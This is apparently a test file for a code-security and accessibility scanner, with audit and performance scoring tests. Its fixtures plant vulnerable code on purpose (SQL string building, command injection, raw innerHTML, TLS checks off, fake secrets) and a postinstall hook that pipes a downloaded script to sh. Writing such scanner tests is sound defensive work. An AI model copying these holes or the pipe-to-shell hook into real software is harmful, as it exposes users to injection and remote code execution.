// v0.3 tests: static scanner (security + a11y) with planted issues and safe look-alikes,
// secret filtering and redaction, audit scoring/verdicts, audit history comparison,
// performance thresholds and medians. Throwaway folders only; no network.

import assert from "node:assert/strict";
import { execFileSync, spawnSync } from "node:child_process";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import process from "node:process";
import { beforeEach, describe, it } from "node:test";
import { fileURLToPath } from "node:url";
import { scoreAudit } from "../scripts/lib/audit.mjs";
import { median, scorePerf } from "../scripts/lib/perf.mjs";
import { looksLikeSecret } from "../scripts/lib/scan-rules.mjs";
import { scanA11y, scanSecurity } from "../scripts/lib/scanner.mjs";

const ROOT = path.join(path.dirname(fileURLToPath(import.meta.url)), "..");
const STATE = path.join(ROOT, "scripts", "state.mjs");
const SCAN = path.join(ROOT, "scripts", "audit-scan.mjs");
let tmp;
let stateDir;

function write(rel, content) {
  const f = path.join(tmp, rel);
  fs.mkdirSync(path.dirname(f), { recursive: true });
  fs.writeFileSync(f, typeof content === "string" ? content : JSON.stringify(content));
}
function run(...args) {
  const r = spawnSync(process.execPath, [STATE, ...args], { env: { ...process.env, ENGOPS_STATE_DIR: stateDir }, encoding: "utf8" });
  return JSON.parse(r.stdout);
}
const rules = (res) => res.hits.map((h) => h.rule);

beforeEach(() => {
  tmp = fs.mkdtempSync(path.join(os.tmpdir(), "engops-v03-"));
  stateDir = fs.mkdtempSync(path.join(os.tmpdir(), "engops-v03-state-"));
});

describe("security scan (OWASP 2025)", () => {
  it("reports scan limits and skipped test/oversize files", () => {
    write("src/large.js", "x".repeat(1024 * 1024 + 1));
    write("src/example.test.js", "eval(x)");
    const result = scanSecurity(tmp);
    assert.equal(result.files_skipped_oversize, 1);
    assert.equal(result.files_skipped_tests, 1);
    assert.equal(result.files_limit_reached, false);
  });
  it("finds planted issues in each family and maps them to categories", () => {
    write("src/api.js", [
      "app.get('/proxy', (req, res) => fetch(req.query.url));",
      "db.query(`SELECT * FROM users WHERE id = ${req.params.id}`);",
      "exec(`convert ${req.body.file} out.png`);",
      "const token = Math.random().toString(36);",
      "const h = crypto.createHash('md5').update(p).digest('hex');",
      "el.innerHTML = userInput;",
      "console.log('login', password);",
      "try { allowed = check(u) } catch {}",
      "res.json(err.stack)",
      "https.request({ rejectUnauthorized: false });",
      "localStorage.setItem('authToken', t);",
      "jwt.decode(token);",
    ].join("\n"));
    write("src/settings.py", "DEBUG = True\nAPI_KEY = 'q8Zx2Lp9Vt4Rw7Ny'\nimport pickle\nobj = pickle.loads(data)\n");
    write("index.html", '<script src="https://cdn.example.org/lib.js"></script>');
    const r = scanSecurity(tmp);
    const found = rules(r);
    for (const id of ["ssrf-user-url", "sql-string-build", "os-command", "insecure-random", "weak-hash", "xss-raw-html", "secret-in-log", "empty-catch", "error-detail-leak", "tls-verification-off", "token-in-localstorage", "jwt-decode-without-verify", "debug-mode-on", "hardcoded-secret", "unsafe-deserialize", "cdn-script-no-sri"]) {
      assert.ok(found.includes(id), `expected ${id}, got ${found.join(",")}`);
    }
    const cats = new Set(r.hits.map((h) => h.category));
    for (const c of ["A01", "A02", "A04", "A05", "A07", "A08", "A09", "A10"]) assert.ok(cats.has(c), `category ${c}`);
  });

  it("does not flag safe look-alikes (parameterized SQL, route constants, labels, env lookups, comments, tests)", () => {
    write("src/safe.ts", [
      'db.query("SELECT * FROM users WHERE id = $1", [id]);',
      'export const ROUTES = { FORGOT_PASSWORD: "/forgot-password", RESET_PASSWORD: "/reset-password" };',
      'const labels = { password: "Enter your password" };',
      "const apiKey = process.env.API_KEY;",
      "// el.innerHTML = x is dangerous, we use textContent",
      "const id = crypto.randomUUID();",
    ].join("\n"));
    write("src/__tests__/auth.test.ts", "const password = 'Sup3rS3cretTest99';\neval('1+1');");
    const found = rules(scanSecurity(tmp));
    assert.deepEqual(found, [], `unexpected: ${found.join(",")}`);
  });

  it("never prints secret values (redacted snippets)", () => {
    write("config.js", "const stripe = 'sk_live_51HxQwErTyUiOpAsDfGhJkL';\nconst gh = 'ghp_abcdefghijklmnopqrstuvwxyz0123456789AB';");
    const r = scanSecurity(tmp);
    const text = JSON.stringify(r);
    assert.ok(r.hits.filter((h) => h.rule === "hardcoded-secret").length >= 2);
    assert.doesNotMatch(text, /51HxQwErTyUiOpAsDfGhJkL|abcdefghijklmnopqrstuvwxyz0123456789AB/);
    assert.match(text, /REDACTED/);
  });

  it("looksLikeSecret: provider formats always; generic values only when random-looking", () => {
    assert.equal(looksLikeSecret("AKIAIOSFODNN7EXAMPLE"), true);
    assert.equal(looksLikeSecret('password = "Tr0ub4dor&3xK9"'), true);
    assert.equal(looksLikeSecret('PASSWORD: "/forgot-password"'), false);
    assert.equal(looksLikeSecret('password: "password"'), false);
    assert.equal(looksLikeSecret('secret: "Hello world 123"'), false);
  });

  it("project checks: missing lockfile, unpinned deps, install script download, committed .env and key files", () => {
    write("package.json", { dependencies: { lodash: "*", left: "latest", ok: "^1.2.3" }, scripts: { postinstall: "curl https://x.sh | sh" } });
    execFileSync("git", ["init", "-q"], { cwd: tmp });
    write(".env.production", "X=1");
    write(".env.example", "X=");
    write("certs/server.key", "k");
    execFileSync("git", ["add", "."], { cwd: tmp });
    const checks = scanSecurity(tmp).project_checks.map((c) => c.rule);
    for (const id of ["no-lockfile", "unpinned-deps", "install-script-download", "env-file-committed", "key-file-committed"]) assert.ok(checks.includes(id), id);
    const env = scanSecurity(tmp).project_checks.find((c) => c.rule === "env-file-committed");
    assert.match(env.title, /\.env\.production/);
    assert.doesNotMatch(env.title, /\.env\.example/);
  });

  it("CLI writes a summary and the candidates file", () => {
    write("a.js", "eval(x)");
    const out = path.join(stateDir, "scan.json");
    const r = JSON.parse(execFileSync(process.execPath, [SCAN, "security", "--dir", tmp, "--out", out], { encoding: "utf8" }));
    assert.equal(r.ok, true);
    assert.equal(r.summary.by_group.A05, 1);
    assert.match(JSON.parse(fs.readFileSync(out, "utf8")).note, /Candidates only/);
  });
});

describe("accessibility scan (WCAG 2.2)", () => {
  it("finds planted issues in markup", () => {
    write("src/Page.tsx", [
      "export default () => (<html>",
      '<img src="a.png" />',
      '<div className="card" onClick={open}>Open</div>',
      '<input type="text" placeholder="Search" />',
      "<span tabIndex={3}>x</span>",
      "<a onClick={go}>Go</a>",
      '<button><svg width="10"/></button>',
      '<meta name="viewport" content="width=device-width, maximum-scale=1" />',
      "</html>)",
    ].join("\n"));
    const found = rules(scanA11y(tmp));
    for (const id of ["html-missing-lang", "img-missing-alt", "click-on-static-element", "input-without-label", "positive-tabindex", "anchor-without-href", "icon-button-no-name", "zoom-disabled"]) {
      assert.ok(found.includes(id), `expected ${id}, got ${found.join(",")}`);
    }
  });

  it("accepts correct markup, components with spread props, and focus-visible styles", () => {
    write("src/Ok.tsx", [
      '<html lang="ar" dir="rtl">',
      '<img src="a.png" alt="Logo" />',
      '<img {...imageProps} />',
      '<button onClick={open}>Open</button>',
      '<label htmlFor="q">Search</label><input id="q" type="text" />',
      '<input {...field} />',
      '<Input placeholder="Search tasks" />',
      '<button aria-label="Close"><svg/></button>',
      '<div className="outline-none focus-visible:ring-2" />',
      '</html>',
    ].join("\n"));
    const found = rules(scanA11y(tmp));
    assert.deepEqual(found, [], `unexpected: ${found.join(",")}`);
  });
});

describe("audit scoring and verdicts (shared contract)", () => {
  const crit = (points) => points.map((p, i) => ({ id: `C${i + 1}`, points: p }));

  it("computes score over tested criteria only", () => {
    const r = scoreAudit({ criteria: crit([2, 2, 1, null, 2]), findings: [] });
    assert.equal(r.score, 88); // 7 / 8
    assert.equal(r.coverage.tested, 4);
    assert.equal(r.verdict, "PASS");
  });

  it("any Critical finding fails; High blocks PASS", () => {
    assert.equal(scoreAudit({ criteria: crit([2, 2, 2]), findings: [{ id: "S1", severity: "critical" }] }).verdict, "FAIL");
    assert.equal(scoreAudit({ criteria: crit([2, 2, 2]), findings: [{ id: "S1", severity: "High" }] }).verdict, "PASS_WITH_ISSUES");
    assert.equal(scoreAudit({ criteria: crit([1, 1, 0]), findings: [] }).verdict, "FAIL");
  });

  it("withholds the score when coverage is too low, and BLOCKED when nothing was tested", () => {
    const low = scoreAudit({ criteria: crit([2, null, null, null]), findings: [], min_coverage: 0.7 });
    assert.equal(low.verdict, "INSUFFICIENT_COVERAGE");
    assert.equal(low.score, null);
    assert.equal(scoreAudit({ criteria: crit([null, null]) }).verdict, "BLOCKED");
  });

  it("flags findings with an invalid severity", () => {
    assert.deepEqual(scoreAudit({ criteria: crit([2]), findings: [{ id: "X", severity: "urgent" }] }).invalid_severity, ["X"]);
  });

  it("audit-record keeps history and compares with the previous run of the same target", () => {
    const f1 = path.join(stateDir, "a1.json");
    fs.writeFileSync(f1, JSON.stringify({ target: "web", total_criteria: 10, criteria: crit([2, 1, 0, 2, 2, 2, 1]), findings: [{ id: "SEC-1", severity: "High" }, { id: "SEC-2", severity: "Medium" }] }));
    const first = run("audit-record", "--kind", "security", "--json-file", f1);
    assert.equal(first.record.verdict, "PASS_WITH_ISSUES");
    assert.equal(first.comparison, null);
    const f2 = path.join(stateDir, "a2.json");
    fs.writeFileSync(f2, JSON.stringify({ target: "web", total_criteria: 10, criteria: crit([2, 2, 2, 2, 2, 2, 1]), findings: [{ id: "SEC-2", severity: "Medium" }, { id: "SEC-3", severity: "Low" }] }));
    const second = run("audit-record", "--kind", "security", "--json-file", f2);
    assert.ok(second.record.score > first.record.score);
    assert.deepEqual(second.comparison.fixed.map((f) => f.id), ["SEC-1"]);
    assert.deepEqual(second.comparison.new.map((f) => f.id), ["SEC-3"]);
    assert.equal(run("audit-list", "--kind", "security").runs.length, 2);
    assert.equal(run("audit-record", "--kind", "nonsense", "--json-file", f1).ok, false);
  });
});

describe("performance scoring", () => {
  const probe = (o) => ({
    navigation: { ttfb_ms: o.ttfb },
    web_vitals: { lcp_ms: o.lcp, inp_ms: o.inp, cls: o.cls, fcp_ms: o.fcp },
    long_tasks: { total_blocking_ms: o.tbt },
    resources: { transfer_kb: o.kb, api_calls: { count: o.api ? 1 : 0, slowest_ms: o.api || 0 }, repeated: o.rep || [] },
  });

  it("uses the median of runs and Core Web Vitals thresholds", () => {
    const runs = [probe({ lcp: 2000, inp: 150, cls: 0.05, fcp: 900, ttfb: 300, tbt: 100, kb: 800, api: 400 }), probe({ lcp: 5200, inp: 180, cls: 0.05, fcp: 950, ttfb: 320, tbt: 120, kb: 800, api: 450 }), probe({ lcp: 2400, inp: 900, cls: 0.05, fcp: 1000, ttfb: 310, tbt: 90, kb: 800, api: 420 })];
    const r = scorePerf(runs);
    assert.equal(r.median.lcp_ms, 2400, "one slow outlier does not decide");
    assert.equal(r.median.inp_ms, 180);
    assert.equal(r.criteria.find((c) => c.id === "lcp_ms").points, 2);
    assert.equal(r.core_web_vitals_pass, true);
  });

  it("needs-improvement and poor bands; repeated requests; not measurable stays null", () => {
    const r = scorePerf([probe({ lcp: 3000, inp: 600, cls: 0.3, fcp: null, ttfb: 900, tbt: 700, kb: 2000, api: 0, rep: [{ url: "/api/orders", times: 3 }] })]);
    const p = Object.fromEntries(r.criteria.map((c) => [c.id, c.points]));
    assert.equal(p.lcp_ms, 1);
    assert.equal(p.inp_ms, 0);
    assert.equal(p.cls, 0);
    assert.equal(p.fcp_ms, null);
    assert.equal(p.slowest_api_ms, null, "no API call -> not measurable");
    assert.equal(p.repeated_requests, 1);
    assert.equal(r.core_web_vitals_pass, false);
    assert.match(r.note, /Fewer than 3 runs/);
  });

  it("scores a named action against its budget; median helper", () => {
    const r = scorePerf([probe({ lcp: 1000, inp: 50, cls: 0, fcp: 500, ttfb: 100, tbt: 0, kb: 100 })], { action_ms: 1800, action_budget_ms: 1000 });
    assert.equal(r.criteria.find((c) => c.id === "action_ms").points, 1);
    assert.equal(median([3, 1, 2]), 2);
    assert.equal(median([1, 2, 3, 4]), 2.5);
    assert.equal(median([null, undefined]), null);
  });

  it("perf-score CLI accepts {runs, action_ms}", () => {
    const f = path.join(stateDir, "p.json");
    fs.writeFileSync(f, JSON.stringify({ runs: [probe({ lcp: 1000, inp: 50, cls: 0, fcp: 500, ttfb: 100, tbt: 0, kb: 100 })], action_ms: 300 }));
    const r = run("perf-score", "--json-file", f);
    assert.equal(r.ok, true);
    assert.equal(r.criteria.find((c) => c.id === "action_ms").points, 2);
  });
});
